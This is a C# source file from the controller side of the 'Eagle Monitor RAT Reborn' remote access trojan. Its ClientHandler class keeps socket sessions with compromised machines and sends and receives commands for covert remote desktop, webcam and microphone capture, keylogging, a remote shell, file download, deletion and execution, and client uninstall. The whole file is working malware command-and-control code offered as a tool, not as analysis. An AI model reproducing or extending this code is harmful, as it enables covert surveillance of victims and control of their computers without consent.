using Eagle_Monitor_RAT_Reborn.Misc;
using PacketLib;
using PacketLib.Packet;
using PacketLib.Utils;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Net.Sockets;
using System.Windows.Forms;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace Eagle_Monitor_RAT_Reborn.Network
{
    internal class ClientHandler : IDisposable
    {
        internal static Dictionary<string, ClientHandler> ClientHandlersList { get; set; }
        internal static int CurrentClientsNumber { get { return ClientHandlersList.Count; } }

        internal static void SendPacketToMultipleClients(IPacket packet)
        {
            foreach (DataGridViewRow dataGridViewRow in Program.mainForm.clientDataGridView.SelectedRows)
            {
                string IP = dataGridViewRow.Cells[2].Value.ToString();
                ClientHandler.ClientHandlersList[IP].SendPacket(packet);
            }
        }

        static ClientHandler()
        {
            ClientHandlersList = new Dictionary<string, ClientHandler>();
        }


        internal delegate byte[] ReadDataAsync();
        internal delegate IPacket ReadPacketAsync(byte[] BufferPacket);
        internal delegate IPacket SendDataAsync(IPacket data);

        private readonly ReadDataAsync readDataAsync;
        private readonly ReadPacketAsync readPacketAsync;
        internal readonly SendDataAsync sendDataAsync;

        internal Socket socket { get; set; }
        internal string IP { get; set; }
        internal string HWID { get; set; }
        internal string fullName { get; set; }
        internal DataGridViewRow clientRow { get; set; }
        internal int serverPort { get; set; }
        internal string clientPath { get; set; }
        internal string clientStatus { get; set; }
        internal bool is64bitClient { get; set; }
        internal bool isAdmin { get; set; }
        internal EncryptionInformation encryptionInformation { get; set; }

        internal ClientForm clientForm { get; set; }
        internal long totalBytesReceived { get; set; }
        internal long totalBytesSent { get; set; }

        internal ClientHandler(Socket sock, int port)
        {
            readDataAsync = new ReadDataAsync(ReceiveData);
            readPacketAsync = new ReadPacketAsync(PacketParser);
            sendDataAsync = new SendDataAsync(SendData);
            this.socket = sock;
            this.IP = socket.RemoteEndPoint.ToString();
            this.serverPort = port;
            Receive();
        }

        internal void Receive()
        {
            if (socket != null)
                readDataAsync.BeginInvoke(new AsyncCallback(EndDataRead), null);
            else
                return;
        }

        private byte[] ReceiveData()
        {
            try
            {
                int total = 0;
                int recv;
                byte[] header = new byte[5];
                socket.Poll(-1, SelectMode.SelectRead);
                recv = socket.Receive(header, 0, 5, 0);

                int size = BitConverter.ToInt32(new byte[4] { header[0], header[1], header[2], header[3] }, 0);
                PacketType packetType = (PacketType)header[4];

                int dataleft = size;
                byte[] data = new byte[size];
                while (total < size)
                {
                    recv = socket.Receive(data, total, dataleft, 0);
                    total += recv;
                    dataleft -= recv;
                }
                return data;
            }
            catch (Exception ex)
            {
                SocketException sockError = ex as SocketException;
                if (sockError != null)
                    this.Dispose();
                return null;
            }
        }
        private void EndDataRead(IAsyncResult ar)
        {
            byte[] data = readDataAsync.EndInvoke(ar);

            if (data != null && data.Length > 0)
                readPacketAsync.BeginInvoke(data, new AsyncCallback(EndPacketRead), null);

            if (socket != null)
                Receive();
        }

        private IPacket PacketParser(byte[] BufferPacket)
        {
            IPacket packet = BufferPacket.DeserializePacket(Program.settings.key);
            packet.packetSize = BufferPacket.Length;
            return packet;
        }

        private void EndPacketRead(IAsyncResult ar)
        {
            IPacket packet = readPacketAsync.EndInvoke(ar);

            if (packet != null)
            {
                switch (packet.packetType)
                {
                    case PacketType.CONNECTED:
                        lock (ClientHandlersList)
                        {
                            ClientHandlersList.Add(this.IP, this);
                        }
                        new PacketHandler(packet, this);
                        break;

                    case PacketType.RM_VIEW_ON:
                        ClientHandler.ClientHandlersList[packet.baseIp].clientForm.remoteDesktopHandler.clientHandler = this;
                        ClientHandler.ClientHandlersList[packet.baseIp].clientForm.remoteDesktopHandler.clientHandler.HWID = packet.HWID;
                        new PacketHandler(packet, this);
                        break;

                    case PacketType.RC_CAPTURE_ON:
                        ClientHandler.ClientHandlersList[packet.baseIp].clientForm.remoteWebCamHandler.clientHandler = this;
                        ClientHandler.ClientHandlersList[packet.baseIp].clientForm.remoteWebCamHandler.clientHandler.HWID = packet.HWID;
                        new PacketHandler(packet, this);
                        break;

                    case PacketType.AUDIO_RECORD_ON:
                        ClientHandler.ClientHandlersList[packet.baseIp].clientForm.remoteMicrophoneHandler.clientHandler = this;
                        ClientHandler.ClientHandlersList[packet.baseIp].clientForm.remoteMicrophoneHandler.clientHandler.HWID = packet.HWID;
                        new PacketHandler(packet, this);
                        break;

                    case PacketType.KEYLOG_ON:
                        ClientHandler.ClientHandlersList[packet.baseIp].clientForm.keyloggerHandler.clientHandler = this;
                        ClientHandler.ClientHandlersList[packet.baseIp].clientForm.keyloggerHandler.clientHandler.HWID = packet.HWID;
                        new PacketHandler(packet, this);
                        break;

                    case PacketType.FM_DOWNLOAD_FILE:
                        new PacketHandler(packet, this);
                        break;

                    case PacketType.CHAT_ON:
                        ClientHandler.ClientHandlersList[packet.baseIp].clientForm.chatHandler.clientHandler = this;
                        ClientHandler.ClientHandlersList[packet.baseIp].clientForm.chatHandler.clientHandler.HWID = packet.HWID;
                        new PacketHandler(packet, this);
                        break;

                    case PacketType.SHELL_START:
                        ClientHandler.ClientHandlersList[packet.baseIp].clientForm.remoteShellHandler.clientHandler = this;
                        ClientHandler.ClientHandlersList[packet.baseIp].clientForm.remoteShellHandler.clientHandler.HWID = packet.HWID;
                        new PacketHandler(packet, this);
                        break;

                    case PacketType.SHELL_COMMAND:
                        ClientHandler.ClientHandlersList[packet.baseIp].clientForm.remoteShellHandler.clientHandler = this;
                        ClientHandler.ClientHandlersList[packet.baseIp].clientForm.remoteShellHandler.clientHandler.HWID = packet.HWID;
                        new PacketHandler(packet, this);
                        break;

                    default:
                        new PacketHandler(packet, ClientHandler.ClientHandlersList[packet.baseIp]);
                        this.Dispose();
                        break;
                }
            }
        }

        internal void SendPacket(IPacket packet)
        {
            packet.HWID = this.HWID;
            if(packet.packetType != PacketType.RM_VIEW_OFF && packet.packetType != PacketType.RC_CAPTURE_OFF && packet.packetType != PacketType.AUDIO_RECORD_OFF && packet.packetType != PacketType.KEYLOG_OFF && packet.packetType != PacketType.CHAT_OFF && packet.packetType != PacketType.SHELL_STOP)
                packet.baseIp = this.IP;

            if (socket != null)
                sendDataAsync.BeginInvoke(packet, new AsyncCallback(SendDataCompleted), null);
        }

        private IPacket SendData(IPacket data)
        {
            byte[] encryptedData = data.SerializePacket(Program.settings.key);

            int total = 0;
            int size = encryptedData.Length;
            int datalft = size;
            byte[] header = new byte[5];

            byte[] temp = BitConverter.GetBytes(size);
            data.packetSize = size;

            header[0] = temp[0];
            header[1] = temp[1];
            header[2] = temp[2];
            header[3] = temp[3];
            header[4] = (byte)data.packetType;

            lock (socket)
            {
                try
                {
                    socket.Poll(-1, SelectMode.SelectWrite);
                    int sent = socket.Send(header);

                    if (size > 1000000)
                    {
                        using (MemoryStream memoryStream = new MemoryStream(encryptedData))
                        {
                            int read = 0;
                            memoryStream.Position = 0;
                            byte[] chunk = new byte[50 * 1000];
                            while ((read = memoryStream.Read(chunk, 0, chunk.Length)) > 0)
                            {
                                socket.Send(chunk, 0, read, SocketFlags.None);
                            }
                        }
                    }
                    else
                    {
                        while (total < size)
                        {
                            sent = socket.Send(encryptedData, total, size, SocketFlags.None);
                            total += sent;
                            datalft -= sent;
                        }
                    }
                    data.packetState = PacketState.SENT;

                }
                catch (Exception ex)
                {
                    data.packetState = PacketState.NOT_SENT;
                    data.status = ex.Message;
                    SocketException sockError = ex as SocketException;
                    if (sockError != null)
                        this.Dispose();
                }
            }
            return data;
        }
        private void SendDataCompleted(IAsyncResult ar)
        {
            IPacket packet = sendDataAsync.EndInvoke(ar);

            packet.datePacketStatus = DateTime.Now.ToString();

            string size = Misc.Utils.Numeric2Bytes(packet.packetSize);

            IAsyncResult result = Program.mainForm.logsDataGridView.BeginInvoke((MethodInvoker)(() =>
            {
                int rowId = Program.mainForm.logsDataGridView.Rows.Add();
                DataGridViewRow row = Program.mainForm.logsDataGridView.Rows[rowId];
                row.Cells["Column11"].Value = packet.HWID;
                row.Cells["Column12"].Value = packet.baseIp;
                row.Cells["Column13"].Value = packet.packetType.ToString();
                row.Cells["Column14"].Style.ForeColor = Color.FromArgb(66, 182, 245);
                row.Cells["Column14"].Value = packet.packetState;
                row.Cells["Column15"].Value = packet.datePacketStatus;
                row.Cells["Column17"].Value = size;

                if (packet.packetState == PacketState.NOT_SENT)
                {
                    row.Cells["Column16"].Value = packet.status;
                    return;
                }
                else
                {
                    switch (packet.packetType)
                    {
                        case PacketType.FM_DOWNLOAD_FILE:
                            row.Cells["Column16"].Value = ((DownloadFilePacket)packet).fileName;
                            break;

                        case PacketType.FM_DELETE_FILE:
                            row.Cells["Column16"].Value = ((DeleteFilePacket)packet).path;
                            break;

                        case PacketType.FM_START_FILE:
                            row.Cells["Column16"].Value = ((StartFilePacket)packet).filePath;
                            break;

                        case PacketType.FM_GET_FILES_AND_DIRS:
                            row.Cells["Column16"].Value = ((FileManagerPacket)packet).path;
                            break;    
                    }
                }
                Program.mainForm.logsDataGridView.ClearSelection();
                Program.mainForm.logsDataGridView.CurrentCell = null;

            }));
            Program.mainForm.logsDataGridView.EndInvoke(result);

            switch (packet.packetType) 
            {
                case PacketType.RM_VIEW_OFF:
                    lock (ClientHandler.ClientHandlersList[packet.baseIp].clientForm.remoteDesktopHandler)
                    {
                        ClientHandler.ClientHandlersList[packet.baseIp].clientForm.remoteDesktopHandler.Dispose();
                        ClientHandler.ClientHandlersList[packet.baseIp].clientForm.remoteDesktopHandler = null;
                    }
                    break;

                case PacketType.RC_CAPTURE_OFF:
                    lock (ClientHandler.ClientHandlersList[packet.baseIp].clientForm.remoteWebCamHandler)
                    {
                        ClientHandler.ClientHandlersList[packet.baseIp].clientForm.remoteWebCamHandler.Dispose();
                        ClientHandler.ClientHandlersList[packet.baseIp].clientForm.remoteWebCamHandler = null;
                    }
                    break;

                case PacketType.AUDIO_RECORD_OFF:
                    lock (ClientHandler.ClientHandlersList[packet.baseIp].clientForm.remoteMicrophoneHandler)
                    {
                        ClientHandler.ClientHandlersList[packet.baseIp].clientForm.remoteMicrophoneHandler.Dispose();
                        ClientHandler.ClientHandlersList[packet.baseIp].clientForm.remoteMicrophoneHandler = null;
                    }
                    break;

                case PacketType.KEYLOG_OFF:
                    lock (ClientHandler.ClientHandlersList[packet.baseIp].clientForm.keyloggerHandler)
                    {
                        ClientHandler.ClientHandlersList[packet.baseIp].clientForm.keyloggerHandler.Dispose();
                        ClientHandler.ClientHandlersList[packet.baseIp].clientForm.keyloggerHandler = null;
                    }
                    break;

                case PacketType.CHAT_OFF:
                    lock (ClientHandler.ClientHandlersList[packet.baseIp].clientForm.chatHandler)
                    {
                        ClientHandler.ClientHandlersList[packet.baseIp].clientForm.chatHandler.Dispose();
                        ClientHandler.ClientHandlersList[packet.baseIp].clientForm.chatHandler = null;
                    }
                    break;

                case PacketType.SHELL_STOP:
                    lock (ClientHandler.ClientHandlersList[packet.baseIp].clientForm.remoteShellHandler)
                    {
                        ClientHandler.ClientHandlersList[packet.baseIp].clientForm.remoteShellHandler.Dispose();
                        ClientHandler.ClientHandlersList[packet.baseIp].clientForm.remoteShellHandler = null;
                    }
                    break;

                case PacketType.RM_MOUSE:
                    break;

                case PacketType.RM_KEYBOARD:
                    break;

                case PacketType.CHAT_ON:
                    break;

                case PacketType.AUDIO_RECORD_ON:
                    break;

                case PacketType.KEYLOG_ON:
                    break;

                case PacketType.RC_CAPTURE_ON:
                    break;

                case PacketType.RM_VIEW_ON:
                    break;

                case PacketType.SHELL_START:
                    break;

                case PacketType.SHELL_COMMAND:
                    break;

                default:
                    if (ClientHandler.ClientHandlersList[packet.baseIp].clientForm != null && packet.packetType != PacketType.CLOSE_CLIENT && packet.packetType != PacketType.UNINSTALL_CLOSE_CLIENT)
                    {
                        result = ClientHandler.ClientHandlersList[packet.baseIp].clientForm.bytesSentlabel.BeginInvoke((Action)(() =>
                        {
                            ClientHandler.ClientHandlersList[packet.baseIp].clientForm.bytesSentlabel.Text = $"Bytes sent : {size}";
                        }));
                        ClientHandler.ClientHandlersList[packet.baseIp].clientForm.bytesSentlabel.EndInvoke(result);
                    }
                    break;
            }
            packet = null;
        }

        public void Dispose()
        {
            if (socket != null)
            {
                socket.Shutdown(SocketShutdown.Both);
                socket.Close();
                socket.Dispose();
                socket = null;
            }

            if (ClientHandlersList.ContainsKey(this.IP))
                ClientHandlersList.Remove(this.IP);

            if (this.clientRow != null)
            {
                lock (Program.mainForm.clientDataGridView)
                {
                    Program.mainForm.clientDataGridView.BeginInvoke((MethodInvoker)(() =>
                    {
                        Program.mainForm.clientDataGridView.Rows.Remove(this.clientRow);
                        Controls.Utils.CloseForm(this.clientForm);
                        /*foreach (KeyValuePair<string, DownloadFileForm> file in downloadForms)
                        {
                            file.Value.clientHandler.Dispose();
                            file.Value.Close();
                        }
                        downloadForms.Clear();*/
                    }));
                }
            }
            Miscellaneous.CleanMemory();
        }
    }
}
